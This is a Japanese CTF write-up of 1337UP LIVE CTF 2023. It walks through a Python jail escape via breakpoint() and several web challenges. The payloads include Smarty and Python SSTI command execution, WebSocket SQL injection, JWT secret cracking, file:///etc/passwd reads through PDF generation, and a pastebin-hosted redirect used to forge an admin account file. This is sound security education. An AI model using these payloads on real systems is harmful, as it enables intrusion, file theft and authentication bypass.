# 1337UP LIVE CTF 2023 Writeup

1337UP LIVE CTF 2023（<https://ctftime.org/event/2134/>）に参加しました。  
金, 17 11月 2023, 11:59 UTC — 土, 18 11月 2023, 23:59 UTC

チーム0nePaddingで参加して32位でした。他のメンバーがRevやPwnを結構解いてくれていたので、いい順位だったのではないかと思います。  
Misc1問とWeb3問を競技中に解きました。  
競技中には解けなかったWeb2問も復習をかねて記載しています。  
興味深い問題が多くて面白かったのですが、ソースコードがない問題が多かったのが辛かったです。

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [Misc](#misc)
  - [PyJail](#pyjail)
- [Web](#web)
  - [Bug Bank](#bug-bank)
  - [Smarty Pants](#smarty-pants)
  - [Bug Report Repo](#bug-report-repo)
  - [Pizza Time](#pizza-time)
  - [My Music](#my-music)

<!-- /code_chunk_output -->

## Misc

![misc](./images/misc.png)

### PyJail

205 points / 87 solves

PythonのJail問題です。  
問題文に、flagは`/flag.txt`にあることが書いてあります。

```python
import ast
import unicodedata

blacklist = "0123456789[]\"\'._"
check = lambda x: any(w in blacklist for w in x)

def normalize_code(code):
    return unicodedata.normalize('NFKC', code)

def execute_code(code):
    try:
        normalized_code = normalize_code(code)
        parsed = ast.parse(code)
        for node in ast.walk(parsed):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in ("os","system","eval","exec","input","open"):
                        return "Access denied!"
            elif isinstance(node, ast.Import):
                return "No imports for you!"
        if check(code):
            return "Hey, no hacking!"
        else:
            return exec(normalized_code, {}, {})
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    while True:
        user_code = input(">> ")
        if user_code.lower() == 'quit':
            break
        result = execute_code(user_code)
        print("Result:", result)
```

関数チェックや禁止文字チェック等をやっているみたいです。

```python
if node.func.id in ("os","system","eval","exec","input","open"):
```

特定の関数は使えないようですが、`breakpoint`は使えるようだったので、それを使ってflagを取得しました。

```sh
$ nc jail.ctf.intigriti.io 1337
>> breakpoint()
--Return--
> <string>(1)<module>()->None
(Pdb) __import__("os").system("cat /flag.txt")
INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}0
```

- FLAG

```text
INTIGRITI{Br4ak_br4ak_Br34kp01nt_ftw}
```

## Web

![web](./images/web.png)

### Bug Bank

100 points / 158 solves

登録したアカウントのBug数（=money）を10000貯めるとFlagがもらえるという問題です。

![bug bank 01](./images/bugbank_01.png)

- ログイン後トップ画面

![bug bank 02](./images/bugbank_02.png)

利用可能な機能として、moneyを他のアカウントに送る機能があります。

![bug bank 03](./images/bugbank_03.png)

そして、この送金機能に脆弱性があるため、マイナスの値を入れて送金すると、送金元のアカウントのmoneyを増やすことができます。

そのため、2つのアカウントを用意して、Amountを`-10000`にして送ることでFlag取得の条件を満たすことができました。

![bug bank 04](./images/bugbank_04.png)
![bug bank 05](./images/bugbank_05.png)

- FLAG

```text
INTIGRITI{h3y_wh0_541d_y0u_c0uld_cl0bb3r_7h3_d0m}
```

- 余談

実はこのアプリにはGraphQLが使われていて、Introspection Queryも使えたのでそれ関係の問題だと思って進めてました。使われていないQueryとかも探して送ってみてましたが、無駄に時間を使っただけでした。  
後、すごくどうでもいいんですが、bugsとmoneyが混在していたのが少し気になりました。

### Smarty Pants

116 points / 99 solves

一画面のシンプルなSSTI問題です。  
この問題にはソースコードが付いていたですが、無くても問題無かったと思います。  
(他の問題には欲しかったです。)

![smarty pants 01](./images/smartypants_01.png)

PHPのテンプレートエンジンのSmartyによって、ユーザが入力した値を画面に出力する処理が入っています。  
そのため、素直にSSTIを目指せばいいのですが、入力値が正規表現でチェックされています。

- 正規表現チェック部分

```php
$pattern = '/(\b)(on\S+)(\s*)=|javascript|<(|\/|[^\/>][^>]+|\/[^>][^>]+)>|({+.*}+)/';
<SNIP>
// returns true if data is malicious
function check_data($data){
	global $pattern;
	return preg_match($pattern,$data);
}

if(check_data($_POST['data'])){
    $smarty->assign('pattern', $pattern);
    $smarty->assign('error', 'Malicious Inputs Detected');
    $smarty->display('index.tpl');
    exit();
}
```

次の4つのパターンが含まれていないことをチェックしているようです。

1. `(\b)(on\S+)(\s*)=`: onから始まる文字列
1. `javascript`: javascript
1. `<(|\/|[^\/>][^>]+|\/[^>][^>]+)>`: タグ
1. `{+.*}+`: 中括弧で囲まれた文字列

1と2と3はXSSの対策のように見えます。  
4が曲者で、SSTIとして使える `{system('ls')}`のような単純な文字列が使えなさそうです。

- 参考: <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#smarty-php>

何個か試していたところ、改行を挟むことで4のチェックを回避できることが分かりました。

```text
{system('ls')
}
```

後は`cat /flag.txt`を実行して完了です。

- FLAG

```text
INTIGRITI{php_4nd_1ts_many_f00tgun5}
```

### Bug Report Repo

342 points / 64 solves

SQLインジェクション+認証回避の問題でした。
サイトにアクセスすると、バグレポートの一覧が表示されます。

![bug report repo 01](./images/bugreportrepo_01.png)

裏側で、WebSocketの通信を行っており、そこにSQLインジェクションの脆弱性がありました。  
ここまではすぐ分かったのですが、UNION SELECTの箇所で手間取りました。  
information_schemaが使えずデータベースの特定もできなかったためです。

以下は動いているようでした。

```sql
2 and '123'='123456'::VARCHAR(3)
1 and 'ab'='a'||'b'
```

ID=11のデータが非表示ながら存在することが分かっていたので、一旦そのデータを取り出してみることにしました。  
テーブル名とカラム名は推測で特定しました。

- WebSocketでのペイロード

```json
{"id":"0 union all select 1,'2','3','4','5','6',(select description from bug_reports where id=11),'8'"}
```

- レスポンス

```json
{"message": "<span class=6>Bug report from crypt0:c4tz on /4dm1n_z0n3, really?! is 6</span>"}
```

`/4dm1n_z0n3`という管理者ページがあることが分かりました。

![bug report repo 02](./images/bugreportrepo_02.png)

ログイン情報も書いてあったのでログインしてみると、`only viewable by admin`と表示されました。  
どうやらadminでログインする必要があるようです。

![bug report repo 03](./images/bugreportrepo_03.png)

認証時にJWTが発行されており、それをCookieに付けて送っていることを確認しました。
None攻撃は使えませんでしたが、`alg`が`HS256`であり、何度ログインしても同じJWTが発行されていたため、固定文字列をシークレットとして付与してJWTを発行しているのではないかと推測しました。

ということで、辞書攻撃でシークレットを探してみると、`catsarethebest`であることが分かりました。

- 利用ツール：[jwt-cracker](https://github.com/lmammino/jwt-cracker)

```sh
$ jwt-cracker -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I -d rockyou.txt
Attempts: 100000 (90K/s last attempt was 'hihih')
Attempts: 200000 (141K/s last attempt was 'ftwftw')
Attempts: 300000 (162K/s last attempt was 'locoroco')
Attempts: 400000 (201K/s last attempt was 'copperkitten')
Attempts: 500000 (213K/s last attempt was 'MATTHEW2')
Attempts: 600000 (178K/s last attempt was '081921')
Attempts: 700000 (182K/s last attempt was 'superson')
Attempts: 800000 (188K/s last attempt was 'saulon')
Attempts: 900000 (204K/s last attempt was 'littleyoda')
SECRET FOUND: catsarethebest
Time taken (sec): 4.491
Total attempts: 920000
```

あとは、adminとして発行したJWTをCookieに付与してアクセスすると、Flagが表示されました。

![bug report repo 04](./images/bugreportrepo_04.png)
![bug report repo 05](./images/bugreportrepo_05.png)

- FLAG

```text
INTIGRITI{w3b50ck37_5ql1_4nd_w34k_jw7}
```

- 余談

なぜいつものUNION SELECTができなかったのか分からなかったので、後で分かったら追記します。  
後、sqlmapを使って解いたという人がいて、それは良いのだろうか？と思ってしまいました。  
このサイトのレスポンスが時折遅くなっていたのはそのせいなのか何なのか。謎です。

### Pizza Time

396 points / 52 solves

ここからは競技中には解けなかった問題となります。  
この問題はPythonのSSTIを使った問題です。

機能としては、商品（ピザ）を注文する機能しかありません。  
注文完了時のレスポンスに注文者の名前と代金が表示されます。

- 商品注文画面

![pizza time 01](./images/pizzatime_01.png)

- 注文完了画面

![pizza time 02](./images/pizzatime_02.png)

この時点では、Pythonが使われていることは分かりませんが、注文者の名前がレスポンスに反映されていることから、SSTIの可能性が高いと思いました。

ただし、`{{7*7}}`のような文字列を注文者の名前（customer_name）に入れて送ると、`Invalid characters detected!`と出力されてしまいます。  
調べた限り、記号は使えない？ようでした。

～ここまでで時間切れ～

他の人の解答を見たところ、どうやら改行（%0a）を入れることで以降は記号が入っていても無視されるようでず。  
改行ももちろん試したはずなのですが、気づかなかったのでつめが甘かったです。

`%0a{{7*7}}`で送信すると、`49`が含まれることを確認しました。

![pizza time 03](./images/pizzatime_03.png)

後は、該当するテンプレートエンジンを調べてSSTIをするだけです。

- POSTパラメータ

```http
customer_name=%0a{{request.application.__globals__.__builtins__.__import__('os').popen('cat$IFS$9/flag.txt').read()}}&pizza_name=Margherita&pizza_size=Small&topping=Mushrooms&sauce=Marinara
```

`$IFS$9`を使っているのは、サーバ側の処理で空白によって区切られることを防ぐためです。

- FLAG

```text
INTIGRITI{d1d_50m3b0dy_54y_p1zz4_71m3}
```

- 余談

解き終えてから他の人の解答をちゃんと見たのですが、`request.headers.get("User-Agent")`を使って、OSコマンド部分はUser-Agentヘッダに入れるという方法を使っていました。スマートで良さそうなので、今度からそっちを使いたいと思います。

### My Music

497 points / 10 solves

PDF生成時のインジェクション（+認証回避）の問題です。
競技中は、PDF生成時のインジェクションを使って`/etc/passwd`の読み取りまではできたのですが、ソースコードの場所が分からずそれ以降には繋げられなかったです。

アカウント登録すると、Profile画面で登録情報の変更とPDFの生成ができます。

![my music 01](./images/mymusic_01.png)

PDF生成の処理で指定できるSpotifyのTrack IDに対して、HTMLタグの埋め込みができることが分かりました。  
これを利用することで、ローカルファイル（`/etc/passwd`）の読み取りができます。

```text
<iframe src='file:///etc/passwd'></iframe>
```

![my music 02](./images/mymusic_02.png)

競技終了後に知りましたが、`<script>document.location='file:///etc/passwd'</script>`を使った方が全画面いっぱいで出力されるので見やすかったようです。  
私も最初は`<script>location='file:///etc/passwd'</script>`を使っていたのですが、画面遷移されない状態でPDFが生成されることが多々あり、iframeを使う方法にしていました。  
書き方によって挙動が若干違うみたいですね。

その後、ローカルファイルの取得をいろいろ試してみましたが、`/proc/`配下のファイルは取得できず、`/flag.txt`もなかったです。  
また、Express+Node.jsが使われていることは分かっていましたが、ソースコードの場所やログファイルの場所は分かりませんでした。

～ここまでで時間切れ～

他の人の解答を見たところ、`/app/app.js`にソースコードがあったようです。  
`/app/index.js`とかは私も試していたので、非常に惜しかったです。というか、またしてもつめが甘かったです。（多分疲れていたんだと思います。）

ソースコードの場所が分かったので、芋づる式にいろいろ見ていきます。  
ソースコードまるまるは載せたくない派ですが、今回は関連がありそうな箇所は載せています。  
また、PDFからコピーしたのでインデントが終わってますが気にしないで進めます。

- `/app/app.js`

```js
const express = require('express')
const { engine } = require('express-handlebars')
const cookieParser = require('cookie-parser')
const { auth } = require('./middleware/auth')
const app = express()
app.engine('handlebars', engine())
app.set('view engine', 'handlebars')
app.set('views', './views')
app.use(express.json())
app.use(cookieParser())
app.use(auth)
app.use('/static', express.static('static'))
app.use('/', require('./routes/index'))
app.use('/api', require('./routes/api'))
app.listen(3000, () => {
 console.log('Listening on port 3000...')
})
```

- `/app/router/index.js`

```js
const express = require('express')
const { requireAuth } = require('../middleware/auth')
const { isAdmin } = require('../middleware/check_admin')
const { getRandomRecommendation } =
require('../utils/recommendedSongs')
const { generatePDF } = require('../utils/generateProfileCard')
const router = express.Router()
router.get('/', (req, res) => {
 const spotifyTrackCode = getRandomRecommendation()
 res.render('home', { userData: req.userData, spotifyTrackCode })
})
router.get('/register', (req, res) => {
 res.render('register', { userData: req.userData })
})
router.get('/login', (req, res) => {
 if (req.loginHash) {
 res.redirect('/profile')
 }
 res.render('login', { userData: req.userData })
})
router.get('/logout', (req, res) => {
 res.clearCookie('login_hash')
 res.redirect('/')
})
router.get('/profile', requireAuth, (req, res) => {
 res.render('profile', { userData: req.userData, loginHash:
req.loginHash })
})
router.post('/profile/generate-profile-card', requireAuth, async
(req, res) => {
 const pdf = await generatePDF(req.userData, req.body.userOptions)
 res.contentType('application/pdf')
 res.send(pdf)
})
router.get('/admin', isAdmin, (req, res) => {
 res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
module.exports = router
```

- `/app/routes/api.js`

```js
const express = require('express')
const { body, cookie } = require('express-validator')
const {
 addUser,
 getUserData,
 updateUserData,
 authenticateAsUser,
} = require('../controllers/user')
const router = express.Router()
router.post(
 '/register',
 body('username').not().isEmpty().withMessage('Username cannot beempty'),
 body('firstName').not().isEmpty().withMessage('First name cannotbe empty'),
 body('lastName').not().isEmpty().withMessage('Last name cannot beempty'),
 addUser
)
router.post(
   '/login',
 body('loginHash').not().isEmpty().withMessage('Login hash cannotbe empty'),
 authenticateAsUser
)
router
 .get('/user', getUserData)
 .put('/user', 
 body('firstName')
 .not()
 .isEmpty()
 .withMessage('First name cannot be empty'),
 body('lastName')
 .not()
 .isEmpty()
 .withMessage('Last name cannot be empty'),
 body('spotifyTrackCode')
 .not()
 .isEmpty()
 .withMessage('Spotify track code cannot be empty'),
 cookie('login_hash').not().isEmpty().withMessage('Login hashrequired'),
 updateUserData
 )
module.exports = router
```

- `/app/middleware/auth.js`
  - ハッシュ値が一致するユーザがいるか確認しているだけなので省略。

- `/app/controllers/user.js`
  - ユーザの登録や情報更新を行っているが、必要なパラメータのみで更新しておりあまり関係が無いため省略。

- `/app/services/user.js`

```js
const fs = require('fs')
const path = require('path')
const { createHash } = require('crypto')
const { v4: uuidv4 } = require('uuid')
const dataDir = './data'
const createUser = (userData) => {
 const loginHash =
createHash('sha256').update(uuidv4()).digest('hex')
 fs.writeFileSync(
 path.join(dataDir, `${loginHash}.json`),
 JSON.stringify(userData)
 )
 return loginHash
}
const setUserData = (loginHash, userData) => {
 if (!userExists(loginHash)) {
 throw 'Invalid login hash'
 }
 fs.writeFileSync(
 path.join(dataDir, `${path.basename(loginHash)}.json`),
 JSON.stringify(userData)
 )
 return userData
}
const getUser = (loginHash) => {
 let userData = fs.readFileSync(
 path.join(dataDir, `${path.basename(loginHash)}.json`),
 {
 encoding: 'utf8',
 }
 )
 return userData
}
const userExists = (loginHash) => {
 return fs.existsSync(path.join(dataDir,
`${path.basename(loginHash)}.json`))
}
module.exports = { createUser, getUser, setUserData, userExists }
```

一通りコードを眺めたところで、`/app/router/index.js`にFlagに関連する処理が書いてあります。

```js
router.get('/admin', isAdmin, (req, res) => {
 res.render('admin', { flag: process.env.FLAG || 'CTF{DUMMY}' })
})
```

どうやら管理者権限で`/admin`にアクセスするとFlagがもらえるようです。  
ここで、`isAdmin`の処理を見てみます。

- `/app/middleware/check_admin.js`
  - 見やすいように少し整形。

```js
const { getUser, userExists } = require('../services/user')
const isAdmin = (req, res, next) => {
  let loginHash = req.cookies['login_hash']
  let userData
  if (loginHash && userExists(loginHash)) {
    userData = getUser(loginHash)
  } else {
    return res.redirect('/login')
  }
  try {
    userData = JSON.parse(userData)
    if (userData.isAdmin !== true) {
      res.status(403)
      res.send('Only admins can view this page')
      return
    }
  } catch (e) {
    console.log(e)
  }
  next()
}
module.exports = { isAdmin }
```

ユーザデータはデータベースではなく、JSONファイルで管理しているようです。  
ログイン時に入力するハッシュ値がJSONのファイル名となっており、該当するファイルの有無で認証をしていることも分かりました。  
権限の部分は、`userData.isAdmin`が`true`であれば管理者として扱っています。

ということで、isAdminがtrueになるようにユーザデータを作れればFlagがもらえるのですが、isAdminに関する処理がユーザ登録処理や更新処理等の他の処理に一切ありませんでした。  
そのため、prototype pollutionのような脆弱性を使ってisAdminをtrueにする方法か、isAdminがtrueとなるようなJSONファイルを一から作って参照させる方法が考えられます。

そこで他に使えそうな処理がないか見てみると、PDF生成処理を行う以下の`generatePDF`関数でオプションが指定できることが分かります。（userOptionsの処理）

- `/app/utils/generateProfileCard.js`
  - 例によって少し整形。

```js
const puppeteer = require('puppeteer')
const fs = require('fs')
const path = require('path')
const { v4: uuidv4 } = require('uuid')
const Handlebars = require('handlebars')
const generatePDF = async (userData, userOptions) => {
  let templateData = fs.readFileSync(
    path.join(__dirname, '../views/print_profile.handlebars'),
    {
      encoding: 'utf8',
    }
  )
  const template = Handlebars.compile(templateData)
  const html = template({ userData: userData })
  const filePath = path.join(__dirname, `../tmp/${uuidv4()}.html`)
  fs.writeFileSync(filePath, html)
  const browser = await puppeteer.launch({
    executablePath: '/usr/bin/google-chrome',
    args: ['--no-sandbox'],
  })
  const page = await browser.newPage()
  await page.goto(`file://${filePath}`, { waitUntil: 'networkidle0' })
  await page.emulateMediaType('screen')
  let options = {
    format: 'A5',
  }
  if (userOptions) {
    options = { ...options, ...userOptions }
  }
  const pdf = await page.pdf(options)
  await browser.close();
  fs.unlinkSync(filePath)
  return pdf
}
module.exports = { generatePDF }
```

`generatePDF`関数の引数の`userOptions`は以下のように指定されるため、ユーザから任意の値を指定できる状態であることが分かります。

- `/app/router/index.js`

```js
const pdf = await generatePDF(req.userData, req.body.userOptions)
```

また、handlebarsにはオプションで任意のファイルを生成することができるようです。

これによって、PDF作成時に以下のようなペイロードを送ることで任意のJSONファイルを生成できるようになります。

```json
{
  "userOptions": {
    "path":"/app/data/aaaaaaaaaaaaaa.json"
  }
}
```

後は、`isAdmin`を持つユーザデータのJSONファイルを作成して、ログイン時にファイル名を指定することでadminになれるはずです。

JSONファイルの内容は、以下のようにします。

```json
{
  "isAdmin": true,
  "username":"test",
  "firstName":"test",
  "lastName":"test",
  "spotifyTrackCode":"test"
}
```

つまり、ユーザのSpotify Track Idに以下のような文字列にした状態で、PDF生成時に`userOptions`を指定すれば良さそうです。  
面倒だったので、pastebinを使いましたが、自サーバに置いた方が良いはずです。

```text
<script>document.location='https://pastebin.com/raw/d2wTmdVh'</script>
```

- PDF生成時のリクエスト

```http
POST /profile/generate-profile-card HTTP/2
Host: mymusic.ctf.intigriti.io
Cookie: login_hash=3517ccd0ca44f9c50e90d7a60cf567114e149173126742565ab5871b0091c378
Content-Length: 73
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Origin: https://mymusic.ctf.intigriti.io
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://mymusic.ctf.intigriti.io/profile
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Priority: u=0, i

{
  "userOptions": {
    "path":"/app/data/aaaaaaaaaaaaaa.json"
  }
}
```

![my music 03](./images/mymusic_03.png)

後は、ログイン時のハッシュに`aaaaaaaaaaaaaa`を入れてログイン、`/admin`にアクセスするとFlagが表示されました。

![my music 04](./images/mymusic_04.png)

- FLAG

```text
INTIGRITI{0verr1d1ng_4nd_n0_r3turn_w4s_n3ed3d_for_th15_fl4g_to_b3_e4rn3d}
```
